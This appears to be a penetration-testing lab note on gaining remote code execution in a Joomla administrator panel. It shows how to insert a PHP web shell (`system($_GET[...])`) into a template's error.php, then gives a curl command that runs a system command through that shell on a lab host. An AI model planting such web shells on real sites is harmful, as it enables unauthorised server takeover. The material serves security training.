## RCE With Access to Control Panel
Log in at /administrator.
We can do this by customizing a template.
We can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.
Next, we can click on a template name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.
Let's choose the `error.php` page. We'll add a PHP one-liner to gain code execution as follows.
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

Access:
```shell
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

*Note*: "An error has occurred. Call to a member function format() on null" can be fixed by disabling the "Quick Icon - PHP Version Check" plugin at this endpoint `/administrator/index.php?option=com_plugins`
